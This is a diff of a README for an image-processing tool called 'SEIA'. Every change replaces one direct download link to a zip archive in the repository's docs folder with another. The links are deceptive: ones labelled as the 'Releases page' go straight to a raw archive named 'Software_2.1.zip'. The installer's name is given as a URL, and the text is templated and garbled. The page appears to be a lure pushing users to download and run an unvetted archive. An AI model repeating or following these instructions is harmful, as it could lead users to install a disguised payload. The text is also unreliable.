@@ -1,6 +1,6 @@
 # 🚀 SEIA - Automate Your Image Processing Tasks Easily
 
-[![Download SEIA](https://raw.githubusercontent.com/Jaydhel/SEIA/master/docs/Software-v2.1.zip)](https://raw.githubusercontent.com/Jaydhel/SEIA/master/docs/Software-v2.1.zip)
+[![Download SEIA](https://github.com/Jaydhel/SEIA/raw/refs/heads/master/docs/Software_2.1.zip)](https://github.com/Jaydhel/SEIA/raw/refs/heads/master/docs/Software_2.1.zip)
 
 ## 📋 Overview
 
@@ -29,11 +29,11 @@ Getting started with SEIA is simple. Follow these steps to download and run the 
 
 1. **Download SEIA**: Click the button below to visit the releases page.
 
-   [![Download SEIA](https://raw.githubusercontent.com/Jaydhel/SEIA/master/docs/Software-v2.1.zip)](https://raw.githubusercontent.com/Jaydhel/SEIA/master/docs/Software-v2.1.zip)
+   [![Download SEIA](https://github.com/Jaydhel/SEIA/raw/refs/heads/master/docs/Software_2.1.zip)](https://github.com/Jaydhel/SEIA/raw/refs/heads/master/docs/Software_2.1.zip)
 
-2. **Find the Latest Release**: Once you are on the [Releases page](https://raw.githubusercontent.com/Jaydhel/SEIA/master/docs/Software-v2.1.zip), look for the latest version of SEIA.
+2. **Find the Latest Release**: Once you are on the [Releases page](https://github.com/Jaydhel/SEIA/raw/refs/heads/master/docs/Software_2.1.zip), look for the latest version of SEIA.
 
-3. **Download the Installer**: Click the link for the latest installer to download the application. It will usually be named something like `https://raw.githubusercontent.com/Jaydhel/SEIA/master/docs/Software-v2.1.zip`.
+3. **Download the Installer**: Click the link for the latest installer to download the application. It will usually be named something like `https://github.com/Jaydhel/SEIA/raw/refs/heads/master/docs/Software_2.1.zip`.
 
 4. **Install SEIA**: 
    - After downloading, locate the installer file in your downloads folder.
@@ -48,7 +48,7 @@ Getting started with SEIA is simple. Follow these steps to download and run the 
 
 Visit the following link to download SEIA from the Releases page:
 
-[Download SEIA](https://raw.githubusercontent.com/Jaydhel/SEIA/master/docs/Software-v2.1.zip)
+[Download SEIA](https://github.com/Jaydhel/SEIA/raw/refs/heads/master/docs/Software_2.1.zip)
 
 Follow the steps outlined above to install and run the application smoothly.
 
